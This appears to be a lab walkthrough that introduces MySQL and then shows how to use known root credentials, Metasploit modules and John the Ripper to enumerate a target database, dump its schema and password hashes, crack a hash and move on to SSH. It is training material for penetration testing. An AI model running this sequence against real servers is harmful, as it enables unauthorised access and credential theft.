
**What is MySQL?**
In its simplest definition, MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL). Too many acronyms? Let's break it down:

**Database:**
A database is simply a persistent, organised collection of structured data

**RDBMS:**
A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).

**How does MySQL work?**
MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol.


# Enumerating 

**The Scenario**  
Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. 

you can connect using to the target using:
```bash
mariadb -h target_ip -u root -p
```

**Note**: If your `mysql` client returns a `TLS/SSL error`, you are advised to add `--ssl-mode=DISABLED`; therefore your command becomes:
```bash
mariadb -h target_ip -u root -p --skip-ssl 
```

If successful, you'll get something like:
```text
MariaDB [(none)]>
```

---
# Enumerate MySQL server using credentials and Metasploit

ex credentials
```text
username: root
password: password
```

---

## 3. Exit MySQL

```sql
exit
```

---

## 4. Start Metasploit

```bash
msfconsole
```

---

## 5. Find the MySQL SQL module

Inside Metasploit:
```text
search mysql_sql
```

You should find:
```text
auxiliary/admin/mysql/mysql_sql
```

Select it:
```text
use auxiliary/admin/mysql/mysql_sql
```

---

## 6. See the required options

```text
show options
```

The important options are typically:
```text
PASSWORD
RHOSTS
USERNAME
```

Set them:
```text
set RHOSTS target_ip
set USERNAME root
set PASSWORD password
```

Then:
```text
show options
```

Make sure they're correct.

---

## 7. Run the default SQL query

Run:
```text
run
```

The module normally uses:
```sql
select version()
```

The result will show the **MySQL/MariaDB version** running on the target.


---

## 8. Ask MySQL what databases exist

Change the SQL query:
```text
set SQL show databases
```

Then run:
```text
run
```

You'll get something similar to:
```text
[*] 10.114.142.105:3306 - Sending statement: 'show databases'
[*] 10.114.142.105:3306 - 4 rows
```

or a table such as:
```text
Database
information_schema
mysql
performance_schema
some_database
```

---

# Exploiting 

## 1. Find the schema dump module

Start Metasploit:
```bash
msfconsole
```

Search:
```text
search mysql_schemadump
```

You should get:
```text
auxiliary/scanner/mysql/mysql_schemadump
```

Select it:
```text
use auxiliary/scanner/mysql/mysql_schemadump
```

Check options:
```text
show options
```

---

## 2. Set the MySQL credentials

Set:

```text
set RHOSTS Target-ip
set USERNAME root
set PASSWORD password
```

Verify:
```text
show options
```

Then run:
```text
run
```

The module will dump the **databases, tables, and columns**.


---

# 3. Find the password-hash module

Search:
```text
search mysql_hashdump
```

The full module name should be:
```text
auxiliary/scanner/mysql/mysql_hashdump
```

Select it:
```text
use auxiliary/scanner/mysql/mysql_hashdump
```

Check:
```text
show options
```

---

## 4. Configure it

```text
set RHOSTS 10.49.181.55
set USERNAME root
set PASSWORD password
```

Then:
```text
run
```

You'll get something similar to:
```text
root:*HASH
username:*EA031893AA21444B170FC2162A56978B8CEECE18
```

---

# 5. Save the hash

Create the file:
```bash
nano hash.txt
```

Put the **entire user/hash combination** inside:
```text
username:*EA031893AA21444B170FC2162A56978B8CEECE18
```

Save:
**Ctrl + O → Enter → Ctrl + X**

Verify:
```bash
cat hash.txt
```

---

# 6. Crack it with John

Run:
```bash
john hash.txt
```

John will try to crack the password.

When it finishes, display the cracked password with:
```bash
john hash.txt --show
```

You'll get something like:
```text
carl:password123
```

The part after `carl:` is the **password you're looking for**.

then go for SSH 

---
